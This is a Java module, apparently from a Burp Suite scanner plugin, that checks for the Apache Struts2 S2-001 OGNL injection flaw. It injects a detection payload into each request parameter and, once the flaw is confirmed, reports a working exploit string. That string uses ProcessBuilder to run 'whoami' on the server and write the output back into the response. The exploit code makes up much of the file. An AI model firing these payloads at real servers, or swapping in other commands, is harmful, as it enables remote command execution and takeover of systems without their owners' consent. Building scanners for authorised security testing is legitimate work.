package module;

import burp.*;

import java.net.URLEncoder;
import java.util.List;

public class S2_001 extends IModule {
    public String poc =
        "%{" +
        "#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\")," +
        "#f.getWriter().print(\"" + injectMark[0] + "\")," +
        "#f.getWriter().print(\"" + injectMark[1] + "\")," +
        "#f.getWriter().flush()," +
        "#f.getWriter().close()" +
        "}";;
    public String exp =
        "%{" +
        "#a=(new java.lang.ProcessBuilder(\"whoami\")).redirectErrorStream(true).start()," +
        "#b=#a.getInputStream()," +
        "#c=new java.io.InputStreamReader(#b)," +
        "#d=new java.io.BufferedReader(#c)," +
        "#e=new char[50000]," +
        "#d.read(#e)," +
        "#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\")," +
        "#f.getWriter().print(new java.lang.String(#e))," +
        "#f.getWriter().flush()," +
        "#f.getWriter().close()}";

    @Override
    public IScanIssue start() {
        List<IParameter> parameters = requestInfo.getParameters();
        for (IParameter parameter: parameters) {
            if (parameter.getType() == (byte) 0 || parameter.getType() == (byte) 1) {
                IParameter newParameter = helpers.buildParameter(parameter.getName(), URLEncoder.encode(poc), parameter.getType());
                request = helpers.updateParameter(iHttpRequestResponse.getRequest(), newParameter);
                if (check()) {
                    this.detail = URLEncoder.encode(exp);
                    return creatCustomScanIssue();
                }
            }
        }
        return null;
    }


}
